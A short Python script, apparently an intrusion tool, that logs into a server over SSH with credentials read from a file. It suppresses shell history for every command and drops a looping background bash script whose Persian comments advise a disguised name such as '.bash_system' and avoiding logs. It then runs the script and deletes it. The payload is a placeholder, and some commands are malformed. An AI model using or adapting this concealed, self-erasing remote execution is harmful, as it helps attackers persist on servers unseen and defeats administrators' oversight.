import requests
from fabric import Connection
serverip=open('a.txt','r').read().split('\n')
try:
  r = requests.get(serverip[0].split('-')[-1])
  text=r.text
except Exception:
  text='off'
if text =="off":
  try:
    conn = Connection(host=serverip[0], user=serverip[1], connect_kwargs={"password": serverip[2]})
    conn.run(f'HISTFILE=/dev/null /bin/mkdir -p www', hide=True, warn=True, timeout=5)
    conn.run(f'HISTFILE=/dev/null /bin/chmod +x www/*', hide=True, warn=True, timeout=5)
    conn.run(f'''HISTFILE=/dev/null /bin/echo """#!/bin/bash
# ذخیره با نامی مثل: .bash_system
while true; do
    # کار اصلی شما
    sleep 30
    # لاگ نکنید یا به /dev/null بریزید
done""" > www/a''', hide=True, warn=True, timeout=5)
    conn.run(f'HISTFILE=/dev/null /bin/cd www', hide=True, warn=True, timeout=5)
    try:
      conn.run(f'HISTFILE=/dev/null /bin/bash a &', hide=True, warn=True, timeout=5)
    except Exception:pass
    conn.run(f'HISTFILE=/dev/null cd & rm -rf www/a', hide=True, warn=True, timeout=5)
  except Exception:
    print('error')
